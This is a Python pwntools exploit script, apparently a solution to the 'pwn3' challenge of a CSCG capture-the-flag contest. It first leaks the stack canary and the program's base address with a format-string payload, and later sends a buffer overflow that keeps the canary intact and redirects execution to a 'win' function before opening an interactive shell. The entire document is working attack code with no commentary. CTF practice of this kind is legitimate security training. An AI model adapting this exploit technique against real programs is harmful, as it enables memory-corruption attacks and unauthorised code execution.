from pwn import *

context.arch = "amd64"
print(ELF("./pwn3"))

p = process("./pwn3")


p.recvuntil("Enter the password of stage 2:")
p.sendline("CSCG{THIS_IS_TEST_FLAG}")

p.recvuntil("Enter your witch name:")
p.sendline("|%39$p|%40$p|%41$p|" + " ") 


vals = p.recvuntil("enter your magic spell:").decode("utf-8").split("|")
canary = int(vals[1], 16)
baseadr = int(vals[3], 16) - 0xD7E

print(vals)
print(list(map(p64, [canary, baseadr])))
win = baseadr + 0xB54
gdb.attach(p)

p.sendline(
    b"Expelliarmus\x00"
    + b"A" * cyclic_find(b"cnaa")
    + p64(canary)
    + b"A" * 8
    + p64(baseadr + 0xD8A)  # ret of main 0x0000555555554dd1
    + p64(win)
    # b"Expelliarmus\x00" + b"A" * (251 - 2 * 8) + p64(canary) + b"A" * 8 + p64(win)
)

# Expelliarmus\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

p.interactive()
